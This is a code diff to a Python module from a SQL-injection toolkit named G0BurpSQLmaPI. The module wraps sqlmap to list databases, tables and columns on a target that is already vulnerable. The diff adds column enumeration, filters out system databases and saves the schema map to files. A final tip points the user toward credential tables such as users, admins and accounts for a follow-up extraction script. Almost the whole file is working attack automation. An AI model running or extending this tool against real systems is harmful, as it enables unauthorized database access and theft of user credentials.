@@ -2,6 +2,7 @@
 """
 G0BurpSQLmaPI - Tables Discovery Module
 Scans for REAL databases and tables - DISCOVERY ONLY
+Shows all tables AND their columns
 Author: nu11secur1ty
 License: GPL-3.0
 """
@@ -73,7 +74,7 @@ def display_banner():
     print(Fore.CYAN + """
 ╔═══════════════════════════════════════════════════════════════╗
 ║                    TABLES DISCOVERY MODULE                    ║
-║           SCANS ALL DATABASES AND TABLES - NO DUMP           ║
+║           SCANS REAL DATABASES, TABLES AND COLUMNS           ║
 ║                   Author: nu11secur1ty                        ║
 ╚═══════════════════════════════════════════════════════════════╝
 """ + Style.RESET_ALL)
@@ -165,9 +166,9 @@ def run_sqlmap_command(cmd, description=""):
         print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
         return ""
 
-def get_all_databases(sqlmap_path, exploit_path, vuln_params):
-    """Get ALL databases - NO FILTERING"""
-    print(Fore.CYAN + "\n[+] Getting ALL databases..." + Style.RESET_ALL)
+def get_real_databases(sqlmap_path, exploit_path, vuln_params):
+    """Get REAL databases - parse only the actual database block"""
+    print(Fore.CYAN + "\n[+] Getting REAL databases..." + Style.RESET_ALL)
     
     cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
     cmd.append("--dbs")
@@ -178,16 +179,48 @@ def get_all_databases(sqlmap_path, exploit_path, vuln_params):
         return []
     
     databases = []
+    in_db_section = False
+    
+    # SKIP - system AND test databases
+    skip = [
+        'information_schema', 'performance_schema', 'mysql', 'sys', 
+        'phpmyadmin', 'starting', 'ending'
+    ]
+    
     for line in output.split('\n'):
-        match = re.search(r'\[\*\]\s+(\w+)', line)
-        if match:
-            db = match.group(1)
-            databases.append(db)
+        # Start collecting when we see the database list header
+        if "available databases [" in line.lower():
+            in_db_section = True
+            continue
+        
+        # If we are in the database list section
+        if in_db_section:
+            # Look for database names in the format [*] db_name
+            match = re.search(r'\[\*\]\s+([\w\-_]+)', line)
+            if match:
+                db = match.group(1)
+                if db.lower() not in skip:
+                    databases.append(db)
+            else:
+                # If we hit a line that's clearly not a database name,
+                # we're probably out of the list section
+                if line.strip() and not line.strip().startswith('['):
+                    in_db_section = False
+    
+    # Remove duplicates and sort
+    databases = sorted(set(databases))
+    
+    if databases:
+        print(Fore.GREEN + f"\n[+] Found {len(databases)} REAL databases:" + Style.RESET_ALL)
+        for i, db in enumerate(databases, 1):
+            print(f"    {i}. {db}")
+    else:
+        print(Fore.YELLOW + "[!] No real databases found." + Style.RESET_ALL)
     
     return databases
 
-def get_all_tables(sqlmap_path, exploit_path, vuln_params, database):
-    """Get ALL tables from a database - NO FILTERING"""
+def get_real_tables(sqlmap_path, exploit_path, vuln_params, database):
+    """Get REAL tables from a database - filter out empty ones"""
     print(Fore.CYAN + f"[*] Getting tables from: {database}" + Style.RESET_ALL)
     
     cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
@@ -198,12 +231,14 @@ def get_all_tables(sqlmap_path, exploit_path, vuln_params, database):
     if not output:
         return []
     
+    # Check if database is empty
     if "appears to be empty" in output:
         print(Fore.YELLOW + f"[!] Database '{database}' appears to be empty" + Style.RESET_ALL)
         return []
     
     tables = []
     for line in output.split('\n'):
+        # Look for table names
         match = re.search(r'\|+\s*(\w+)\s*\|+', line)
         if match:
             table = match.group(1)
@@ -218,7 +253,36 @@ def get_all_tables(sqlmap_path, exploit_path, vuln_params, database):
     
     return list(set(tables))
 
-def save_results(all_data, databases_count, total_tables):
+def get_table_columns(sqlmap_path, exploit_path, vuln_params, database, table):
+    """Get ALL columns from a specific table"""
+    print(Fore.CYAN + f"    [*] Getting columns from: {database}.{table}" + Style.RESET_ALL)
+    
+    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
+    cmd += ["-D", database, "-T", table, "--columns"]
+    
+    output = run_sqlmap_command(cmd, f"Scanning columns for {table}")
+    
+    if not output:
+        return []
+    
+    columns = []
+    for line in output.split('\n'):
+        # Look for column names
+        match = re.search(r'\|+\s*(\w+)\s*\|+', line)
+        if match:
+            col = match.group(1)
+            if col and len(col) > 1 and col not in ['Column', '---', 'columns']:
+                columns.append(col)
+        
+        match = re.search(r'\[\*\]\s+(\w+)', line)
+        if match:
+            col = match.group(1)
+            if col and len(col) > 1:
+                columns.append(col)
+    
+    return list(set(columns))
+
+def save_results(all_data, databases_count, total_tables, total_columns):
     """Save results to JSON and TXT files"""
     # Save JSON
     json_file = OUTPUT_DIR / "tables_scan.json"
@@ -237,20 +301,22 @@ def save_results(all_data, databases_count, total_tables):
         
         f.write(f"[Summary]\n")
         f.write(f"  Databases found: {databases_count}\n")
-        f.write(f"  Tables found: {total_tables}\n\n")
+        f.write(f"  Tables found: {total_tables}\n")
+        f.write(f"  Columns found: {total_columns}\n\n")
         
         for db, tables in all_data.items():
-            if tables:
-                f.write(f"\n[Database] {db}\n")
-                f.write(f"[Tables] {len(tables)}\n")
-                f.write("-"*40 + "\n")
-                for table in tables:
-                    f.write(f"  - {table}\n")
+            f.write(f"\n[Database] {db}\n")
+            f.write(f"[Tables] {len(tables)}\n")
+            f.write("-"*40 + "\n")
+            for table, columns in tables.items():
+                f.write(f"  - {table}\n")
+                for col in columns:
+                    f.write(f"      - {col}\n")
     
     print(Fore.GREEN + f"[+] TXT saved to: {txt_file}" + Style.RESET_ALL)
 
 def run_tables_discovery():
-    """Main function - discover ALL databases and tables"""
+    """Main function - discover REAL databases, tables and columns"""
     display_banner()
     
     # Check if exploit exists
@@ -286,43 +352,46 @@ def run_tables_discovery():
     print()
     
     # Confirm
-    confirm = input(Fore.YELLOW + "Start TABLES DISCOVERY (no dump)? [Y/n]: " + Style.RESET_ALL).strip().lower()
+    confirm = input(Fore.YELLOW + "Start FULL TABLES DISCOVERY (no dump)? [Y/n]: " + Style.RESET_ALL).strip().lower()
     if confirm not in ("", "y", "yes"):
         print(Fore.YELLOW + "Cancelled." + Style.RESET_ALL)
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # STEP 1: Get ALL databases
-    databases = get_all_databases(sqlmap_path, exploit_path, vuln_params)
+    # STEP 1: Get REAL databases
+    databases = get_real_databases(sqlmap_path, exploit_path, vuln_params)
     
     if not databases:
         print(Fore.RED + "No databases found!" + Style.RESET_ALL)
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # Show databases
-    print(Fore.GREEN + f"\n[+] Found {len(databases)} databases:" + Style.RESET_ALL)
-    for i, db in enumerate(databases, 1):
-        print(f"    {i}. {db}")
-    
     # STEP 2: Get tables from each database
-    print(Fore.CYAN + "\n[+] Scanning tables..." + Style.RESET_ALL)
+    print(Fore.CYAN + "\n[+] Scanning tables and columns..." + Style.RESET_ALL)
     print("="*60)
     
     all_data = {}
     total_tables = 0
+    total_columns = 0
     
     for db in databases:
-        tables = get_all_tables(sqlmap_path, exploit_path, vuln_params, db)
+        tables = get_real_tables(sqlmap_path, exploit_path, vuln_params, db)
         
         if tables:
-            all_data[db] = tables
+            all_data[db] = {}
             total_tables += len(tables)
             print(Fore.GREEN + f"[+] {db}: {len(tables)} tables" + Style.RESET_ALL)
+            
             for table in tables:
-                print(Fore.CYAN + f"    - {table}" + Style.RESET_ALL)
+                columns = get_table_columns(sqlmap_path, exploit_path, vuln_params, db, table)
+                all_data[db][table] = columns
+                total_columns += len(columns)
+                print(Fore.CYAN + f"    - {table}: {len(columns)} columns" + Style.RESET_ALL)
+                if columns:
+                    for col in columns:
+                        print(Fore.MAGENTA + f"        - {col}" + Style.RESET_ALL)
         else:
-            all_data[db] = []
+            all_data[db] = {}
             print(Fore.YELLOW + f"[!] {db}: No tables found" + Style.RESET_ALL)
     
     # Summary
@@ -331,9 +400,10 @@ def run_tables_discovery():
     print("="*60 + Style.RESET_ALL)
     print(Fore.GREEN + f"[+] Databases discovered: {len(databases)}" + Style.RESET_ALL)
     print(Fore.GREEN + f"[+] Tables discovered: {total_tables}" + Style.RESET_ALL)
+    print(Fore.GREEN + f"[+] Columns discovered: {total_columns}" + Style.RESET_ALL)
     
     # Save results
-    save_results(all_data, len(databases), total_tables)
+    save_results(all_data, len(databases), total_tables, total_columns)
     
     print(Fore.CYAN + "\nTIP: Update Users.py with these table names:" + Style.RESET_ALL)
     print(Fore.YELLOW + "Look for: users, admins, members, login, accounts, profiles, customers, employees, auth, roles" + Style.RESET_ALL)
